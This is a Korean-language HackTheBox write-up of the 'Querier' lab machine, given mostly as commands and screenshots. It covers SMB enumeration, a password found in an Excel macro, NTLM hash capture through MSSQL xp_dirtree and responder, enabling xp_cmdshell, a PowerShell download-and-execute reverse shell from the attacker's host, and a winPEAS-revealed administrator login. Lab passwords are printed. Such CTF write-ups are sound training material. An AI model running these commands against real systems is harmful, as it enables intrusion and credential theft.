# Querier - HackTheBox
## Recon
```bash
sudo nmap -p 135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671 -sC -sV -vv -oA querier 10.129.24.92
```
<img width="1206" height="311" alt="image" src="https://github.com/user-attachments/assets/7547a813-d66b-4b58-8839-9fb0e05ccaf3" />
<img width="1206" height="68" alt="image" src="https://github.com/user-attachments/assets/c0365e5f-4ad7-4aec-be4a-6add9b192e14" />

- SMB(445)
- MSSQL(1433)
- WINRM(5985)

<br>

- `/etc/hosts`에 `QUERIER.HTB.LOCAL` 등록.
<img width="1206" height="68" alt="image" src="https://github.com/user-attachments/assets/fde3fbeb-0e5f-4264-a284-5dbb93be52e8" />

---
## Auth as reporting
- SMB 수집.
```bash
smbmap -u 'guest' -p '' -H 10.129.24.92
```
<img width="1206" height="162" alt="image" src="https://github.com/user-attachments/assets/4502a49a-9420-4f11-93af-f3944147fbb2" />

<br>
<br>

- 유저목록 수집.
```bash
nxc smb 10.129.24.92 -u guest -p '' --rid-brute --local-auth|grep SidTypeUser
```
<img width="1206" height="188" alt="image" src="https://github.com/user-attachments/assets/3a3feb21-e0d7-42fa-b3d9-04e3cb25ea42" />

<br>
<br>

- `/Reports` 접속해서 내부 파일 다운로드.
```bash
smbclient -U guest //10.129.24.92/Reports
```
<img width="1206" height="313" alt="image" src="https://github.com/user-attachments/assets/85bc741b-0c7b-4c54-87f1-154adcac86dd" />

<br>
<br>

- `Currency Volume Report.xlsm`를 열어보았으나 내용은 없음.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/22bcc279-2d30-47df-b4a7-75600acd9b1e" />

<br>
<br>

- 매크로 확인.
- `PcwTWTHRwryjc$c6` 비밀번로 데이터베이스 로그인을 시도하는 것처럼 보임.
<img width="1855" height="1068" alt="image" src="https://github.com/user-attachments/assets/970a5399-1c5f-424b-b24e-6d205cb81653" />

<br>
<br>

- 로그인 시도하여 `reporting`계정 로그인 성공.
```bash
nxc smb 10.129.24.92 -u users -p 'PcwTWTHRwryjc$c6' --local-auth --continue-on-success
```
<img width="1206" height="230" alt="image" src="https://github.com/user-attachments/assets/efa790e6-5217-48c5-98c1-52f1d43cf5c1" />

---
## Shell as mssql-svc
- `nxc`로 로그인 테스트는 실패하였으나 `mssql` 접속 성공.
```bash
impacket-mssqlclient reporting:'PcwTWTHRwryjc$c6'@10.129.24.92 -windows-auth
```
<img width="1206" height="270" alt="image" src="https://github.com/user-attachments/assets/72a2a427-d53e-4156-8ab6-c1eecbe65467" />

<br>
<br>

- 특별한 정보를 찾을 수 없었음.
- `responder`를 사용하여 해시 캡쳐
```
sudo responder -I tun0 -v

SQL (QUERIER\reporting  reporting@volume)> EXEC master..xp_dirtree '\\10.10.14.23\share\'
```
<img width="1206" height="66" alt="image" src="https://github.com/user-attachments/assets/c65c5903-e664-482f-85d5-cc869aa9ed2c" />
<img width="1206" height="200" alt="image" src="https://github.com/user-attachments/assets/eb97efa9-906f-4eac-9257-f08ad6ea06dc" />

<br>
<br>

- 크래킹 시도.
```bash
john hash --wordlist=~/util/rockyou.txt
```
<img width="1206" height="225" alt="image" src="https://github.com/user-attachments/assets/3ba41692-6102-446e-98c0-52e21dc8eee2" />

<br>
<br>

- `mssql-svc:corporate568`로 `mssql` 접속.
<img width="1206" height="268" alt="image" src="https://github.com/user-attachments/assets/fbd22d95-7103-415a-b64e-53252094ff01" />

<br>
<br>

- `xp_cmdshell` 활성화하여 명령어 실행 가능.
```
SQL (QUERIER\mssql-svc  dbo@master)> EXECUTE sp_configure 'show advanced options', 1

SQL (QUERIER\mssql-svc  dbo@master)> RECONFIGURE

SQL (QUERIER\mssql-svc  dbo@master)> EXECUTE sp_configure 'xp_cmdshell', 1

SQL (QUERIER\mssql-svc  dbo@master)> RECONFIGURE

SQL (QUERIER\mssql-svc  dbo@master)> EXECUTE xp_cmdshell 'whoami'
```
<img width="1206" height="290" alt="image" src="https://github.com/user-attachments/assets/78b76828-5702-4546-af4a-57dd1fb7b20b" />

<br>
<br>

- 리버스 셸 실행.
```
SQL (QUERIER\mssql-svc  dbo@master)> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.23/rev.ps1") | powershell -noprofile'
```
<img width="1206" height="48" alt="image" src="https://github.com/user-attachments/assets/c748e696-b251-4312-8a23-2a37629e732f" />

<br>
<br>

- 셸 획득.
<img width="1206" height="422" alt="image" src="https://github.com/user-attachments/assets/4166d5cc-cfc1-4266-9ce3-8885247c28eb" />

---
## Privesc
- `winpeas`를 로컬로부터 다운로드 받아서 실행.
- `administrator`의 비밀번호 노출.
<img width="1203" height="379" alt="image" src="https://github.com/user-attachments/assets/0be56318-2f77-4f38-9564-d932f2d78017" />

<br>
<br>

- `administrator:MyUnclesAreMarioAndLuigi!!1!` WINRM 로그인 성공.
```bash
nxc winrm 10.129.24.92 -u administrator -p 'MyUnclesAreMarioAndLuigi!!1!' --local-auth
```
<img width="1203" height="204" alt="image" src="https://github.com/user-attachments/assets/aa9cd637-620e-4d25-8e2d-c3d5d4b851fa" />

<br>
<br>

- 셸 획득.
```bash
evil-winrm -i 10.129.24.92 -u administrator -p 'MyUnclesAreMarioAndLuigi!!1!'
```
<img width="1203" height="288" alt="image" src="https://github.com/user-attachments/assets/b0034f3e-a81d-4c36-9238-16178ef2ffbc" />

---
## FLAG
- `c:\users\mssql-svc\desktop\user.txt`
<img width="1203" height="206" alt="image" src="https://github.com/user-attachments/assets/984048e5-351b-4377-ac01-06b541773a05" />

<br>
<br>

- `c:\users\administrator\desktop\root.txt`
<img width="1203" height="206" alt="image" src="https://github.com/user-attachments/assets/5ad9b2a5-b762-493d-90a3-72c83659d00e" />
